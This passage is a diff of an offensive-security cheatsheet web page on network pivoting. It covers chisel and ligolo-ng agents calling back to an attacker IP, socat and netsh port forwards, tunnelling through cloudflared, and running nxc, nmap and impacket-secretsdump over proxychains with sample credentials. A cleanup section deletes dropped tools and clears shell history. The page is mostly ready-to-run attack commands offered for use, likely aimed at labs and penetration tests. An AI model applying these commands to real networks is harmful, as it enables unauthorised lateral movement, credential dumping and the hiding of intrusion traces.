+</span></span><span class=line><span class=cl><span class=c1>## Windows</span>
+</span></span><span class=line><span class=cl>.<span class=se>\c</span>hisel.exe client 10.10.14.1:8000 R:socks
+</span></span><span class=line><span class=cl><span class=c1>## SOCKS now listens on attacker&#39;s 127.0.0.1:1080</span>
+</span></span></code></pre></div><p>Reverse single-port forward, no SOCKS overhead:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>./chisel client 10.10.14.1:8000 R:9000:172.16.5.10:445
+</span></span><span class=line><span class=cl><span class=c1>## Attacker&#39;s 127.0.0.1:9000 reaches the internal SMB host</span>
+</span></span></code></pre></div><h2 id=iv-ligolo-ng data-heading-permalink=true><span class=heading-content>iv. Ligolo-ng</span>
+<a class=heading-permalink href=#iv-ligolo-ng aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>TUN interface on attacker, full L3 access, faster than chisel, no proxychains needed.</p><p>Attacker:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo ip tuntap add user <span class=nv>$USER</span> mode tun ligolo
+</span></span><span class=line><span class=cl>sudo ip link <span class=nb>set</span> ligolo up
+</span></span><span class=line><span class=cl>./proxy -selfcert
+</span></span><span class=line><span class=cl><span class=c1>## In ligolo prompt:</span>
+</span></span><span class=line><span class=cl>session
+</span></span><span class=line><span class=cl><span class=c1>## Pick session, then:</span>
+</span></span><span class=line><span class=cl>start
+</span></span><span class=line><span class=cl><span class=c1>## Add route from attacker to internal range:</span>
+</span></span><span class=line><span class=cl>sudo ip route add 172.16.5.0/24 dev ligolo
+</span></span></code></pre></div><p>Agent on pivot:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## Linux</span>
+</span></span><span class=line><span class=cl>./agent -connect 10.10.14.1:11601 -ignore-cert
+</span></span><span class=line><span class=cl><span class=c1>## Windows</span>
+</span></span><span class=line><span class=cl>.<span class=se>\a</span>gent.exe -connect 10.10.14.1:11601 -ignore-cert
+</span></span></code></pre></div><p>After <code>start</code>, every tool on attacker (nmap, nxc, ssh) routes to the internal range with no proxychains.</p><div class="obsidian-callout callout-tip"><div class=obsidian-callout-header><div class=obsidian-callout-icon aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8.5 14.5A2.5 2.5.0 0011 12c0-1.38-.5-2-1-3-1.072-2.143-.224-4.054 2-6 .5 2.5 2 4.9 4 6.5s3 3.5 3 5.5A7 7 0 115 15c0-1.153.433-2.294 1-3a2.5 2.5.0 002.5 2.5z"/></svg></div><span class=obsidian-callout-title>Agent-side listener</span></div><div class=obsidian-callout-body><p>Need the pivot to expose a port back to attacker side? Use ligolo&rsquo;s <code>listener_add</code> to bind on the agent and forward to attacker, useful for relaying NTLM auth back through the tunnel.</p></div></div><h2 id=v-pure-tcp-forwards data-heading-permalink=true><span class=heading-content>v. Pure TCP forwards</span>
+<a class=heading-permalink href=#v-pure-tcp-forwards aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>socat one-shot port forward, no extra tooling:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## On pivot, forward pivot:9000 -&gt; 172.16.5.10:445</span>
+</span></span><span class=line><span class=cl>socat TCP-LISTEN:9000,fork,reuseaddr TCP:172.16.5.10:445
+</span></span></code></pre></div><p>Windows netsh, built-in:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>netsh interface portproxy add v4tov4 listenport=9000 listenaddress=0.0.0.0 connectport=445 connectaddress=172.16.5.10
+</span></span><span class=line><span class=cl>netsh interface portproxy show all
+</span></span><span class=line><span class=cl>netsh interface portproxy delete v4tov4 listenport=9000 listenaddress=0.0.0.0
+</span></span></code></pre></div><h2 id=vi-tunnel-over-https data-heading-permalink=true><span class=heading-content>vi. Tunnel over HTTPS</span>
+<a class=heading-permalink href=#vi-tunnel-over-https aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>When outbound is HTTPS only. Wrap chisel or ligolo in cloudflared.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## Attacker</span>
+</span></span><span class=line><span class=cl>chisel server -p <span class=m>8000</span> --reverse <span class=p>&amp;</span>
+</span></span><span class=line><span class=cl>cloudflared tunnel --url tcp://localhost:8000 --no-autoupdate
+</span></span><span class=line><span class=cl><span class=c1>## cloudflared prints a https://random.trycloudflare.com URL</span>
+</span></span><span class=line><span class=cl><span class=c1>## Pivot</span>
+</span></span><span class=line><span class=cl>cloudflared access tcp --hostname random.trycloudflare.com --url localhost:8000 <span class=p>&amp;</span>
+</span></span><span class=line><span class=cl>./chisel client 127.0.0.1:8000 R:socks
+</span></span></code></pre></div><p>See <a href=https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service target=_blank rel="noopener noreferrer">THC&rsquo;s iq article</a>
+for the gost + cloudflared pattern.</p><h2 id=vii-proxychains-config data-heading-permalink=true><span class=heading-content>vii. ProxyChains config</span>
+<a class=heading-permalink href=#vii-proxychains-config aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p><code>/etc/proxychains.conf</code> (or <code>~/.proxychains/proxychains.conf</code>):</p><pre tabindex=0><code>strict_chain
 proxy_dns
 [ProxyList]
 socks5 127.0.0.1 1080
-</code></pre><p>Run any tool through it:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains -q nxc smb 172.16.5.0/24 -u admin -p <span class="s1">&#39;Password1&#39;</span>
-</span></span><span class="line"><span class="cl">proxychains -q nmap -sT -Pn -n -p445,3389 172.16.5.0/24
-</span></span><span class="line"><span class="cl">proxychains -q impacket-secretsdump admin:<span class="s1">&#39;Password1&#39;</span>@172.16.5.10
-</span></span></code></pre></div><div class="obsidian-callout callout-warning">
-  <div class="obsidian-callout-header">
-    <div class="obsidian-callout-icon" aria-hidden="true">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"></path>
-          <path d="M12 9v4"></path>
-          <path d="M12 17h.01"></path></svg>
-    </div>
-    <span class="obsidian-callout-title">ProxyChains and ICMP</span>
-  </div>
-  <div class="obsidian-callout-body">
-    <p>ProxyChains tunnels TCP only. nmap host discovery (<code>-PE</code>, ARP, ICMP) does not work through it. Always use <code>-Pn -sT</code> over SOCKS. Use ligolo if you need real ICMP or UDP.</p>
-  </div>
-</div>
-<h2 id="viii-cleanup" data-heading-permalink="true"><span class="heading-content">viii. Cleanup</span>
-    <a class="heading-permalink" href="#viii-cleanup" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Attacker</span>
-</span></span><span class="line"><span class="cl">sudo ip route del 172.16.5.0/24
-</span></span><span class="line"><span class="cl">sudo ip link del ligolo
-</span></span><span class="line"><span class="cl">pkill chisel
-</span></span><span class="line"><span class="cl"><span class="c1">## Pivot</span>
-</span></span><span class="line"><span class="cl">rm -f /tmp/chisel /tmp/agent
-</span></span><span class="line"><span class="cl"><span class="nb">history</span> -c
-</span></span></code></pre></div>
-        </div>
-
-        
-          <nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href="/cheatsheets/misc/password-cracking/">
-            <div class="cheatsheet-pager-copy">
-              <span class="cheatsheet-pager-label">Previous</span>
-              <span class="cheatsheet-pager-title">Password Cracking</span>
-            </div>
-            <span class="cheatsheet-pager-arrow" aria-hidden="true">
-              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-    <path d="m12 19-7-7 7-7"></path>
-    <path d="M19 12H5"></path>
-  </svg>
-            </span>
-          </a><a class="cheatsheet-pager-link is-next" href="/cheatsheets/misc/recon-external/">
-            <div class="cheatsheet-pager-copy">
-              <span class="cheatsheet-pager-label">Next</span>
-              <span class="cheatsheet-pager-title">Recon (external)</span>
-            </div>
-            <span class="cheatsheet-pager-arrow" aria-hidden="true">
-              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-    <path d="m12 19-7-7 7-7"></path>
-    <path d="M19 12H5"></path>
-  </svg>
-            </span>
-          </a></nav>
-        
-      </div>
-    </div>
-  </article>
-  
-
-  </main>
-  <button class="scroll-top-button" type="button" data-scroll-top aria-label="Scroll to top" aria-hidden="true" tabindex="-1">
-    <svg viewBox="0 0 24 24" aria-hidden="true">
-      <path d="M12 18V6"></path>
-      <path d="M6.75 11.25 12 6l5.25 5.25"></path>
-    </svg>
-  </button>
-  <footer class="site-footer">
-  <p>&copy; 2026 JinPwn</p>
-</footer>
-
-</body>
-</html>
+</code></pre><p>Run any tool through it:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>proxychains -q nxc smb 172.16.5.0/24 -u admin -p <span class=s1>&#39;Password1&#39;</span>
+</span></span><span class=line><span class=cl>proxychains -q nmap -sT -Pn -n -p445,3389 172.16.5.0/24
+</span></span><span class=line><span class=cl>proxychains -q impacket-secretsdump admin:<span class=s1>&#39;Password1&#39;</span>@172.16.5.10
+</span></span></code></pre></div><div class="obsidian-callout callout-warning"><div class=obsidian-callout-header><div class=obsidian-callout-icon aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 00-3.48.0l-8 14A2 2 0 004 21h16a2 2 0 001.73-3z"/><path d="M12 9v4"/><path d="M12 17h.01"/></svg></div><span class=obsidian-callout-title>ProxyChains and ICMP</span></div><div class=obsidian-callout-body><p>ProxyChains tunnels TCP only. nmap host discovery (<code>-PE</code>, ARP, ICMP) does not work through it. Always use <code>-Pn -sT</code> over SOCKS. Use ligolo if you need real ICMP or UDP.</p></div></div><h2 id=viii-cleanup data-heading-permalink=true><span class=heading-content>viii. Cleanup</span>
+<a class=heading-permalink href=#viii-cleanup aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## Attacker</span>
+</span></span><span class=line><span class=cl>sudo ip route del 172.16.5.0/24
+</span></span><span class=line><span class=cl>sudo ip link del ligolo
+</span></span><span class=line><span class=cl>pkill chisel
+</span></span><span class=line><span class=cl><span class=c1>## Pivot</span>
+</span></span><span class=line><span class=cl>rm -f /tmp/chisel /tmp/agent
+</span></span><span class=line><span class=cl><span class=nb>history</span> -c
+</span></span></code></pre></div></div><nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href=/cheatsheets/misc/password-cracking/><div class=cheatsheet-pager-copy><span class=cheatsheet-pager-label>Previous</span>
+<span class=cheatsheet-pager-title>Password Cracking</span></div><span class=cheatsheet-pager-arrow aria-hidden=true><svg width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>
+</span></a><a class="cheatsheet-pager-link is-next" href=/cheatsheets/misc/recon-external/><div class=cheatsheet-pager-copy><span class=cheatsheet-pager-label>Next</span>
+<span class=cheatsheet-pager-title>Recon (external)</span></div><span class=cheatsheet-pager-arrow aria-hidden=true><svg width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg></span></a></nav></div></div></article></main><button class=scroll-top-button type=button data-scroll-top aria-label="Scroll to top" aria-hidden=true tabindex=-1>
+<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 18V6"/><path d="M6.75 11.25 12 6l5.25 5.25"/></svg></button><footer class=site-footer><p>&copy; 2026 JinPwn</p></footer></body></html>
